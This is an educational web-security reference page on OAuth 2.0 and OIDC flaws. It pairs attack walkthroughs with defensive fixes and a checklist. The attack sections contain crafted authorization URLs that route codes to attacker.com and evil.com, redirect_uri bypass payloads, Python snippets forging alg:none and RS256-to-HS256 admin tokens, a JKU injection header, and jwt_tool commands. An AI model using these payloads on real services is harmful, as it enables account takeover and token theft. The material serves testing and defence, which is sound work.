OAuth 2.0 / OIDC Flaws

CWE-601 · CWE-287 · Account takeover via authorization code theft, open redirects, state bypass, and token leakage — the most complex auth attack surface

OAuth 2.0 is an authorization framework — it lets a user grant a third-party application limited access to their account on another service, without sharing their password. OIDC (OpenID Connect) adds identity on top of OAuth, enabling "Login with Google/GitHub/etc." Each step in the flow is a potential attack point.

① Open redirect_uri — authorization code theftCritical — account takeover

If the auth server doesn't validate the exact redirect_uri, an attacker can substitute their own URL. The auth code is sent to the attacker's server — they exchange it for an access token and take over the account.

# Step 1: Craft authorization request with attacker's redirect_uri https://accounts.google.com/o/oauth2/auth ?client_id=VICTIM_APP_CLIENT_ID &redirect_uri=https://attacker.com/steal ← attacker's server &response_type=code &scope=email+profile &state=... # Step 2: Send this URL to victim (phishing, or via open redirect on legitimate site) # Victim clicks → logs in → Google sends code to attacker.com/steal # Step 3: Attacker exchanges code for token POST https://oauth.server/token code=STOLEN_CODE client_id=VICTIM_APP_CLIENT_ID client_secret=... ← attacker needs this too (harder for confidential clients) redirect_uri=https://attacker.com/steal # For public clients (SPAs, mobile apps) — no client_secret needed! # Full account takeover with just the code.
② Missing or broken state parameter — OAuth CSRFHigh

The state parameter is OAuth's CSRF token. If missing or not verified, an attacker can force a victim to link their account to the attacker's identity.

# Attack: attacker initiates their own OAuth flow, captures the callback URL # before completing it — then tricks victim into visiting that callback URL. # Step 1: Attacker starts OAuth with their own account # Gets callback: https://app.com/callback?code=ATTACKER_CODE&state=abc # Step 2: Attacker sends victim to: # https://app.com/callback?code=ATTACKER_CODE (no state check on app side) # Step 3: App exchanges ATTACKER_CODE for token # App now thinks victim has linked ATTACKER's account # Attacker logs in → gets victim's session! # Verify state vulnerability: # Remove &state= from callback URL — does the app still process it? # Or: change state to arbitrary value — does the app reject it?
③ redirect_uri validation bypassHigh
# Exact match required — but many servers check loosely: # Path traversal bypass: redirect_uri=https://app.com/callback/../../../attacker-path # Subdomain bypass (if server checks only domain): redirect_uri=https://evil.app.com/steal # Query parameter bypass: redirect_uri=https://app.com/callback?redirect=https://evil.com # Open redirect on legitimate app used as redirect_uri: redirect_uri=https://app.com/logout?next=https://evil.com/steal # → code sent to app.com, then app.com redirects to evil.com with code in URL! # Fragment bypass: redirect_uri=https://app.com/callback#https://evil.com # All variations to test: # - Add extra path segments # - Add subdomains # - Use @ in URL (user@host confusion) # - Append attacker domain after legitimate path
④ Token leakage — Referer, logs, browser historyHigh
# Implicit flow sends access_token in URL fragment: https://app.com/callback#access_token=TOKEN&token_type=bearer # → Stored in browser history # → Logged by web server (if fragment is somehow processed) # → Leaked in Referer header to third-party scripts on the page # Authorization code in URL → logged by server before being exchanged: https://app.com/callback?code=AUTH_CODE # If code isn't single-use or has long expiry → extractable from logs # Check: does the auth server enforce single-use codes? # Replay test: use the same code twice → should fail on second attempt

OpenID Connect adds an ID token (a JWT) to OAuth. JWT-specific attacks apply here — algorithm confusion, none algorithm, and key confusion can bypass authentication entirely.

alg:none — unsigned token accepted
# Some JWT libraries accept "none" as algorithm — token with no signature # Original token header: {"alg":"HS256","typ":"JWT"} # Forged: {"alg":"none","typ":"JWT"} # Forge a token claiming to be admin: import base64, json header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=') payload = base64.urlsafe_b64encode(b'{"sub":"admin","email":"admin@corp.com","role":"admin"}').rstrip(b'=') token = header + b'.' + payload + b'.' # empty signature! # If server accepts: full admin access with no secret key needed
Algorithm confusion — RS256 to HS256
# RS256: server signs with private key, verifies with public key # Attack: trick server into treating the PUBLIC key as an HMAC secret # then sign a token with HS256 using the public key → server verifies it! # Step 1: Get the server's public key (often at /.well-known/jwks.json) curl https://auth.target.com/.well-known/jwks.json # Extract the RSA public key # Step 2: Create forged token signed with HS256 using the public key as secret # Tools: jwt_tool, python-jwt, pyjwt python3 -c " import jwt pub_key = open('public_key.pem').read() token = jwt.encode({'sub':'admin','role':'admin'}, pub_key, algorithm='HS256') print(token) " # If server uses alg from token header without restricting to RS256 → accepted!
JWK injection — supply your own key
# Some servers trust the "jwk" or "jku" header parameter in the token itself # Attack: embed your own public key in the token header, sign with matching private key # JWK injection (embed key in header): header = { "alg": "RS256", "typ": "JWT", "jwk": { "kty": "RSA", "n": "ATTACKER_MODULUS", "e": "AQAB", "use": "sig" } } # Sign with attacker's private key matching the embedded public key # If server uses the jwk header to verify → attacker controls verification! # JKU (JWK Set URL) injection: header = {"alg":"RS256","jku":"https://attacker.com/jwks.json"} # Server fetches attacker's JWKS to verify the token → SSRF + key control
OIDC claim spoofing & email verification bypass
# Some apps trust email from ID token without verifying it's confirmed # Google/GitHub allow unverified emails in some flows # email_verified claim missing → app trusts unverified email: { "sub": "12345", "email": "admin@corp.com", "email_verified": false ← but app doesn't check this! } # → Register with unverified email → gain admin@corp.com account # Audience (aud) claim not validated: # Token issued for app client_id=APP_A # Used against APP_B which doesn't check aud # → Cross-application token reuse # jwt_tool for JWT testing: python3 jwt_tool.py TOKEN -T # tamper mode — try all attacks python3 jwt_tool.py TOKEN -X a # test alg:none python3 jwt_tool.py TOKEN -X s # test RS256→HS256 confusion

① Validate redirect_uri with exact match Root fix
Pre-register all allowed redirect URIs as exact strings. At runtime, reject any request whose redirect_uri doesn't exactly match a registered value — no wildcards, no prefix match, no path comparison.
## Authorization server (Node.js example) const REGISTERED_URIS = new Set([ 'https://app.example.com/callback', 'https://app.example.com/auth/callback', ]); function validateRedirectUri(requestedUri) { if (!REGISTERED_URIS.has(requestedUri)) { throw new Error('Invalid redirect_uri'); } } // No partial matching, no endsWith, no regex — exact set membership only
② Always use and verify the state parameter Essential
Generate a cryptographically random state value per flow, store it in the session, and reject any callback where the state doesn't match. This is OAuth's built-in CSRF protection.
// Generate state when starting OAuth flow const state = crypto.randomBytes(32).toString('hex'); req.session.oauthState = state; // In callback handler — verify before doing ANYTHING app.get('/callback', (req, res) => { if (req.query.state !== req.session.oauthState) { return res.status(403).json({ error: 'State mismatch — possible CSRF' }); } // Only now proceed to exchange the code delete req.session.oauthState; // single-use });
③ Use PKCE for public clients (SPAs, mobile) Modern best practice
PKCE (Proof Key for Code Exchange) prevents authorization code interception even if the code is stolen — the code can only be exchanged by whoever generated the original code_verifier.
// Client generates a code_verifier (random) + code_challenge (SHA256 hash) const verifier = base64url(crypto.randomBytes(32)); const challenge = base64url(crypto.createHash('sha256').update(verifier).digest()); // Include in authorization request: // &code_challenge=CHALLENGE&code_challenge_method=S256 // Include in token exchange: // &code_verifier=VERIFIER // Even if attacker intercepts the code, they don't have the verifier → useless
④ JWT validation — fix algorithm handling Server-side
Always specify the expected algorithm explicitly when verifying JWTs. Never allow the algorithm to be determined from the token header.
## Python — pyjwt (correct usage) import jwt # WRONG — takes algorithm from token header: decoded = jwt.decode(token, public_key, algorithms=None) # CORRECT — explicitly restrict algorithm: decoded = jwt.decode(token, public_key, algorithms=['RS256']) # Also validate audience and issuer: decoded = jwt.decode(token, public_key, algorithms=['RS256'], audience='my-app-client-id', issuer='https://accounts.google.com' ) ## Node.js / jsonwebtoken jwt.verify(token, publicKey, { algorithms: ['RS256'] }) // Never: { algorithms: ['none'] } or omitting algorithms
⑤ Security checklist
Exact-match redirect_uri — never wildcards or partial matching  ·  State parameter: random, per-session, verified before code exchange  ·  PKCE for all public clients (SPAs, mobile apps)  ·  Authorization codes: single-use, short expiry (60 seconds)  ·  JWT: explicit algorithm allowlist, validate aud + iss + exp  ·  Never use implicit flow — use authorization code + PKCE instead  ·  Validate email_verified claim before linking accounts by email  ·  Never allow jwk or jku header injection in JWT verification
